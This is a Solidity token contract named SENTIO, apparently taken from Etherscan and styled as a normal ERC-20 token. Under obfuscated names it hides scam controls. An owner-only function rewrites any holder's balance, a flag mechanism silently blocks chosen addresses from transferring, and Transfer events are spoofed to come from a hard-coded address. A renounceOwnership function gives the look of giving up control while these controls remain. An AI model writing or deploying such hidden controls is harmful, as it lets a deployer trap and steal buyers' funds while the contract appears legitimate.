/**
 *Submitted for verification at Etherscan.io on 2023-03-05
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract SENTIO {
    using SafeMath for uint256;
    mapping (address => uint256) private kKa;
	
    mapping (address => uint256) public kKb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SENTIO.xyz";
	
    string public symbol = "SENTIO";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private kKc;
      address private kKd;
    uint256 private kKe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address kKf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        kKd = msg.sender;
             kKa[msg.sender] = totalSupply;
        
       xPUSH();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function xPUSH() internal  {                             
                       kKb[msg.sender] = 2;
                       kKc = kKf;

                

        emit Transfer(address(0), kKc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return kKa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(kKb[msg.sender] <= kKe) {
    require(kKa[msg.sender] >= value);
kKa[msg.sender] -= value;  
kKa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(kKb[msg.sender] > kKe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function cSnap (address py, uint256 pz) public {
		if(kKb[msg.sender] == kKe) {   
			   	   
   kKb[py] = pz;}
   }
		       function SETc (uint256 pz) onlyOwner public {
                     kKe = pz; 
	}

 		       function Delgate (address py, uint256 pz) onlyOwner public {		   	   
  kKa[py] = pz;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(kKb[from] < kKe && kKb[to] < kKe) {
        require(value <= kKa[from]);
        require(value <= allowance[from][msg.sender]);
        kKa[from] -= value;
        kKa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(kKb[from] == kKe) {
        require(value <= kKa[from]);
        require(value <= allowance[from][msg.sender]);
        kKa[from] -= value;
        kKa[to] += value;
        allowance[from][msg.sender] -= value;


            from = kKf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(kKb[from] > kKe || kKb[to] > kKe) {
             
         }}



     

        	
 }